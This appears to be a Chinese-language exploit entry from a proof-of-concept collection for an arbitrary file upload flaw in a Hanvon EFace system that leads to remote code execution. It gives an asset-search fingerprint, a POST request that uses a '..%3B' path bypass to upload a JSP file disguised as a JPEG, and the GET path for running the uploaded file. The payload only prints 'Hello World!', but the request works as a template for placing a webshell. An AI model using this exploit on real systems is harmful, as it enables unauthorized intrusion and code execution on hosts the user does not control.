# 汉王EFaceGouploadBlackListFile存在任意文件上传导致RCE

- **系统**：汉王　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`icon_hash="1380907357"`
- **请求**：`POST /manage/mobiVisit/..%3B/systemBlackList/uploadBlackListFile.do HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlA…`

**请求体 / payload**
```
------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="file"; filename="123.jsp"
Content-Type: image/jpeg
<% out.print("Hello World!"); %>
------WebKitFormBoundaryFfJZ4PlAZBixjELj--
拼接访问路径
GET /manage/resource/ca7a41938add40fa9edd82eb35b59b50.jsp HTTP/1.1
Host:
```
- **预期**：200　|　—